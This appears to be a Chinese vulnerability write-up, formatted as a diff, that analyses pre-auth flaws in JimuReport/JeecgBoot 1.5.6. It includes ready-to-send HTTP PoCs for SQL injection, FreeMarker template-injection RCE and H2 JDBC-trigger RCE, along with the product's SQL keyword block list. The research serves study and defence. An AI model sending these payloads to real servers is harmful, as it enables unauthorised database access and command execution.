@@ -1,0 +1,110 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>最近三个月三次遇到了jeecgboot，要是算上没有识别出来的估计会更多，逮着一个前台模板注入薅了两次，所以这次来对低版本的积木报表做个前台漏洞总结，刚好也算是对这种涉及到jar包审计的学习</p>
+<pre><code>POC
+POST /jeecg-boot/jmreport/qurestSql HTTP/1.1
+Host: 192.168.200.1:3100
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+Content-Length: 148
+Connection: close
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+Pragma: no-cache
+Cache-Control: no-cache
+
+{"apiSelectId":"1316997232402231298","id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select current_user)),1)) or '%%' like '","39tzamcto0d":"="}</code></pre>
+<p>复现分析的第一处难点就是路由，全局去找qurestSql，没有什么成果</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240726174225-5d692c16-4b33-1.png"/><br/>
+这就意味着这个接口可能是写在jar包里面的，那就得先祭出jadx反编译jar包<br/>
+在jar包中找到路径</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240726174236-6407a570-4b33-1.png"/><br/>
+在idea中打开</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240726174246-6a08ffe6-4b33-1.png"/><br/>
+对应的路径如下<br/>
+/repository/org/jeecgframework/jimureport/jimureport-spring-boot-starter/1.5.6/jimureport-spring-boot-starter-1.5.6.jar!/org/jeecg/modules/jmreport/desreport/a/a.class<br/>
+这里算是比较明显的，将json格式的传参var1中的apiSelectId拆解出来作为var3,然后将var3作为索引id获取var4，var4和脱去apiSelectId的var1一起作为参数传入看起来有风险的函数qurestechSql中<br/>
+联系poc中的两个json参数(apiSelectId和id)，正好是对应的</p>
+<p>先看getById方法<br/>
+C:/Users/LEGION/.m2/repository/org/jeecgframework/jimureport/jimureport-spring-boot-starter/1.5.6/jimureport-spring-boot-starter-1.5.6.jar!/org/jeecg/modules/jmreport/desreport/service/IJmReportDbService.class</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240726174255-6f478af4-4b33-1.png"/><br/>
+其实现如下</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240726174302-73986baa-4b33-1.png"/><br/>
+继续跟进get方法</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240726174309-77a8d4b4-4b33-1.png"/><br/>
+根据这里系的sql语句，应该是从jimu_report_db中根据id索引查，查出来的东西就作为var4,找到对应的表，看看里面都是什么</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240726174316-7c009c4a-4b33-1.png"/><br/>
+其中有个ad_dyn_sql，其中的db_dyn_sql字段就有风险写法的sql语句作为值</p>
+<p>结合方法名qurestechsql，猜想可能是把sql语句拿来用了(不然存在里面做什么？)<br/>
+在方法定义处，确实如此</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240726174323-7fda1530-4b33-1.png"/><br/>
+调试过程中可见也用上了对应的sql语句</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240726174330-83f8500a-4b33-1.png"/><br/>
+于是这里当是使用了id作为db_dyn_sql字段中取出的sql语句的参数，而db_dyn_sql中的sql语句没有使用预编译写法导致的注入</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240726174337-88370792-4b33-1.png"/></p>
+<p>前台sql注入导致的rce</p>
+<pre><code>poc
+POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
+Host: 127.0.0.1:8080
+User-Agent: curl/7.88.1
+Accept: */*
+Content-Type: application/json
+Content-Length: 121
+Connection: close
+
+{
+    "sql": "&lt;#assign ex=\"freemarker.template.utility.Execute\"?new()&gt;${ex(\"touch /tmp/success\")}",
+    "type": "0"
+}</code></pre>
+<p>同样的，这些个未授权的接口作者很喜欢写在jar包里面<br/>
+jar包中路径<br/>
+/repository/org/jeecgframework/jimureport/jimureport-spring-boot-starter/1.5.6/jimureport-spring-boot-starter-1.5.6.jar!/org/jeecg/modules/jmreport/desreport/a/a.class</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240726174346-8d85a974-4b33-1.png"/></p>
+<p>这里已经明说了是解析sql</p>
+<p>在方法的最后，传入经过排查的sql语句到方法parseReportSql中</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240726174355-932cc0f6-4b33-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240726174358-95108c5e-4b33-1.png"/><br/>
+这里实现了解析sql并执行，而在前面是有防火墙过滤参数的</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240726174405-98eeae78-4b33-1.png"/><br/>
+在方法中<br/>
+可以看到这几步是解析并使用模板执行的</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240726174415-9ef61dba-4b33-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240726174421-a25dd7e0-4b33-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240726174424-a47e6314-4b33-1.png"/><br/>
+于是乎，虽然这里因为存在内置waf过滤导致无法进行sql注入，但是利用存在的模板解析成果实现了命令执行<br/>
+过滤鬼册<br/>
+private final static String XSS_STR = "and |extractvalue|updatexml|geohash|gtid_subset|gtid_subtract|exec |insert |select |delete |update |drop |count |chr |mid |master |truncate |char |declare |;|or |+|user()";</p>
+<p>3.未授权构造连接数据库操作导致rce</p>
+<p>在jadx中看得比较清楚，大白话，一眼看出是在使用传参连接数据库，应该是开发过程中图方便留的接口，跟那些个测试账号泄露的逻辑雷同</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240726174436-aba27342-4b33-1.png"/><br/>
+传入的类</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240726174443-af75d8b0-4b33-1.png"/><br/>
+最后构造的payload</p>
+<pre><code>POST /jeecgboot/jmreport/testConnection HTTP/1.1
+Host: 192.168.90.1:3100
+Content-Length: 383
+Accept: application/json, text/plain, */*
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+Content-Type: application/json;charset=UTF-8
+Origin: http://192.168.90.1:3100
+Referer: http://192.168.90.1:3100/login?redirect=/dashboard/analysis
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+{
+  "id": "1",
+  "code": "dataSource1",
+  "dbType": "H2",
+  "dbDriver": "org.h2.Driver",
+  "dbUrl": "jdbc:h2:mem:test;init=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec('open -a calculator.app')\u000A$$",
+  "dbName": "test",
+  "dbUsername": "sa",
+  "dbPassword": "",
+  "connectTimes": 5
+}</code></pre>
+</div>
+</div>
